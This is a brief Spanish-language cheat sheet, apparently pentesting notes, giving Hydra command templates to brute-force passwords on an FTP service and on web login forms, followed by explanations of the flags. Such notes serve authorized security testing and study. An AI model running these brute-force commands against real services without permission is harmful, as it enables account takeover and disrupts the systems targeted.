fuerza bruta

Hydra

Fuerza bruta en un servicio

hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<ip_objetivo>:<puerto>

Fuerza bruta en un panel login web

hydra -L <users.txt> -P <pass.txt> <ip_target> http-get /webdav/

hydra -L <users.txt>  -P <pass.txt> <ip_target> http-post-form "<target_domain>/login:username=^USER^&password=^PASS^:Invalid username or password" -t 50 -F

Se usan los marcadores estándar ^USER^ y ^PASS^ que Hydra reconoce para sustituir usuario/contraseña en formularios web.

  • -l <user>: un usuario
  • -L <file>: fichero con usuarios (uno por línea)
  • -p <pass>: una contraseña
  • -P <file>: fichero con contraseñas (diccionario)
  • -t <number>: hilos
  • -F: para la ejecución al encontrar credenciales
  • http-post-form / http-get-form: módulos para formularios web
